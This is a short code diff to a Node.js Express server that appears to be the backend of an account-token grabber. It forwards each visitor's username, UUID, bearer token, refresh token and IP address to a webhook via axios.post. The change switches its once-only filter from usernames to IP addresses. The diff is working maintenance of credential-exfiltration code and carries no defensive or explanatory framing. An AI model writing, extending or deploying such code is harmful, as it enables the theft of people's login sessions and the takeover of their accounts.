@@ -27,7 +27,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        if (checkIfBanned(username)) {
+        if (checkIfBanned(ip)) {
             return
         }
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
@@ -143,18 +143,18 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
-const bannedNames = []
+const bannedIps = []
 
-function addBan(name) {
-    bannedNames.push(name);
+function addBan(ip) {
+    bannedIps.push(ip);
 }
 
-function checkIfBanned(name) {
-    for (const item of bannedNames) {
-        if (name === item) {
+function checkIfBanned(ip) {
+    for (const item of bannedIps) {
+        if (ip === item) {
             return true
         }
     }
-    addBan(name)
+    addBan(ip)
     return false
 }
